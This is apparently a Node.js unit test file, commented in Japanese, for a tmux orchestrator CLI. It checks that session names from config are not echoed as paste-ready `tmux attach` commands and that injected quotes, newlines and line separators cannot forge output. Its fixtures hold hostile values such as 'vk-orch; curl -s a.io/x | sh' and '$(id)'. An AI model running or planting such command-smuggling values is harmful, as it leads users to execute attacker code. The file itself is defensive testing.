/**
 * tmux モードの `up` が出すセッション名まわりの案内文のユニットテスト（issue #253）。
 *
 * セッション名は設定ファイル由来（env VK_TMUX_SESSION > config tmux.session）で、
 * 従来は `tmux attach -t <セッション名>` という **そのまま貼れるコマンド行** に素で
 * 埋まっていた。細工された設定を含むリポジトリを clone した人が案内どおり貼ると、
 * `vk-orch; curl -s a.io/x | sh` のような値がそのまま成立する。
 *
 * bin/vk-orchestrator.js（エントリポイント）は import すると CLI が走ってしまうため、
 * 判定と文言は src/setup/tmux-attach-guidance.js へ切り出してここで検証する。
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  formatTmuxAttachGuidance,
  formatTmuxSessionLabel,
} from '../src/setup/tmux-attach-guidance.js';

test('formatTmuxAttachGuidance: 正常なセッション名では従来どおり attach コマンドを案内する', () => {
  // 許可リストが過剰に効いて、普通に使っている人の案内まで削らないことの担保。
  for (const session of ['vk-orch', 'my_orch-2', 'orch.dev']) {
    const text = formatTmuxAttachGuidance(session);
    assert.equal(
      text,
      `\`tmux attach -t ${session}\` で入れます（Ctrl-b d で離脱、切断されても動作継続）。`,
    );
  }
});

test('formatTmuxAttachGuidance: シェルで意味を持つ文字を含む値では attach コマンドを案内しない', () => {
  // 「1 語で成立する」値だけでなく、空白入りでも防げること（claudeCommand と違い
  // セッション名は先頭トークン抽出を通らないので、空白も改行もそのまま届く）。
  for (const session of [
    'vk-orch; curl -s a.io/x | sh',
    'vk-orch`id`',
    '$(id)',
    'vk-orch && id',
  ]) {
    const text = formatTmuxAttachGuidance(session);
    // そのまま貼れるコマンド行を出さないこと（attach の形を一切作らない）。
    assert.ok(!text.includes('tmux attach -t'), `attach コマンドを出さないこと: ${text}`);
    // 値そのものの表示は残す（config.json のどの値を直すのか特定できないと直せない）。
    // ただし引用符込み（JSON.stringify）で、コマンド行としてではなく出すこと。
    assert.ok(
      text.includes(JSON.stringify(session)),
      `どの値が問題かは引用符込みで示すこと: ${text}`,
    );
    // 代わりに、値の見直しと復帰手段を伝えること（案内を削るだけで詰ませない）。
    assert.match(text, /tmux\.session/);
    assert.match(text, /VK_TMUX_SESSION/);
    assert.match(text, /設定した覚えのない値なら/);
    // 復帰手段は設定値を含まない `tmux attach`（-t なし）＋ Ctrl-b s にする。
    // `tmux ls` を案内すると一覧に素の名前が出て、利用者が自分で
    // `tmux attach -t <名前>` を組み立てる＝防ごうとした事故へ誘導してしまう。
    assert.match(text, /`tmux attach`/);
    assert.match(text, /Ctrl-b s/);
    assert.doesNotMatch(text, /tmux ls/);
  }
});

test('formatTmuxAttachGuidance: 値に " を入れても引用符の外へ出られない', () => {
  // 手書きの "…" だと引用符を閉じられ、案内文の手前に偽の指示文を作れる。
  const session = 'vk-orch"。復旧するには次を実行: curl a.io/x | sh #';
  const text = formatTmuxAttachGuidance(session);
  // JSON.stringify なので " はエスケープされて現れる（生の " で閉じられない）。
  assert.ok(text.includes('\\"'), `" をエスケープして表示すること: ${text}`);
  // 生の値がそのままの形では現れない＝引用符を閉じて外へ出られない。
  assert.ok(!text.includes(session), `引用符の外へ出さないこと: ${text}`);
  // 表示部分は JSON 文字列として閉じており、読み戻すと元の値に一致する（壊していない）。
  assert.ok(text.includes(JSON.stringify(session)), `値は引用符込みで示すこと: ${text}`);
});

test('formatTmuxAttachGuidance: 制御文字入りの値でも案内が 1 行のまま崩れない', () => {
  // 改行をそのまま出すと、コンソールに偽の行（別の指示文）を作れる。
  //
  // 2 つ目の値は「制御文字を落とすと許可リストを通る」ケース。生の値への判定
  // （isShellSafeCommandForDisplay(raw) &&）を外すと安全側へ入り、raw をそのまま
  // 埋める設計なので改行込みでコマンド行に入って案内が 2 行に割れる。生値側のガードを
  // 固定するためのケースなので消さないこと。
  for (const session of ['vk-orch\n[up] ✅ すべて充足しています', 'vk-orch\n./setup']) {
    const text = formatTmuxAttachGuidance(session);
    assert.ok(!text.includes('\n'), `1 行に収めること: ${JSON.stringify(text)}`);
    assert.ok(!text.includes('tmux attach -t'), `attach コマンドを出さないこと: ${text}`);
    // 生の値（改行込み）がそのまま現れないこと。
    assert.ok(!text.includes(session), `設定値を素のまま埋めないこと: ${JSON.stringify(text)}`);
  }
});

test('formatTmuxAttachGuidance: U+2028 / U+2029 入りの値でも偽の行を作れない', () => {
  // 端末では行が割れないが、CSS はこの 2 文字を強制改行として扱う。`up` の出力を
  // GitHub の issue へ貼ると、ブラウザ上では偽の行が独立して見えてしまう。
  for (const separator of ['\u2028', '\u2029']) {
    const text = formatTmuxAttachGuidance(`vk-orch${separator}[up] ✅ すべて充足しています`);
    assert.ok(!text.includes(separator), `行区切り文字を落とすこと: ${JSON.stringify(text)}`);
    assert.ok(!text.includes('tmux attach -t'), 'attach コマンドを出さないこと');
  }
});

test('formatTmuxSessionLabel: 未設定は "undefined" ではなく空文字として表示する', () => {
  // 実在しない名前を出すと、利用者がそれを自分の設定値だと誤解する。
  assert.equal(formatTmuxSessionLabel(undefined), '""');
  assert.equal(formatTmuxSessionLabel(null), '""');
});

test('formatTmuxSessionLabel: 通常のセッション名は従来と同じ "…" 表示になる', () => {
  // 手書きの `"${session}"` から JSON.stringify へ替えても、普通の値では出力が変わらないこと。
  assert.equal(formatTmuxSessionLabel('vk-orch'), '"vk-orch"');
  // 日本語などの非 ASCII はエスケープせずそのまま読める形で出す。
  assert.equal(formatTmuxSessionLabel('開発用'), '"開発用"');
});

test('formatTmuxSessionLabel: 制御文字は除去し、" と \\ はエスケープする', () => {
  // 除去（表示を素直に読ませる）とエスケープ（引用符から出させない）の両方が効くこと。
  assert.equal(formatTmuxSessionLabel('vk\u0007-orch\u001b[31m'), '"vk-orch"');
  assert.equal(formatTmuxSessionLabel('a"b\\c'), '"a\\"b\\\\c"');
});
